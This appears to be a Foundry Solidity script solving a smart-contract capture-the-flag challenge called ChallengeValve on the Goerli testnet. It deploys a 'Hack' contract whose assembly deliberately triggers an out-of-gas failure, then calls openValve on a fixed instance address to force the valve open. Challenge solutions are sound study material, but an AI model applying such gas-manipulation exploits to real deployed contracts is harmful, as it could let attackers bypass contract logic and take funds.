// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ChallengeValve.sol";

contract Hack is INozzle {
    function insert() external returns (bool result) {
        // 0xkarmacoma
        assembly {
            mstore(not(0),  1)
        }
    }
}

// https://goerli.etherscan.io/address/0x935CA126020B002e1B5CA47fCD8f882bD8964641
contract ChallengeValveScript is Script {
    address constant instance = 0x935CA126020B002e1B5CA47fCD8f882bD8964641;

    function run() public {
        vm.startBroadcast();

        Valve valve = Valve(instance);
        INozzle nozzle = new Hack();

        // this needs to be sent from outside the script, looks like foundry won't set the gas limit this way
        valve.openValve{gas: 100000}(nozzle);

        console.log("open", valve.open());
    }
}
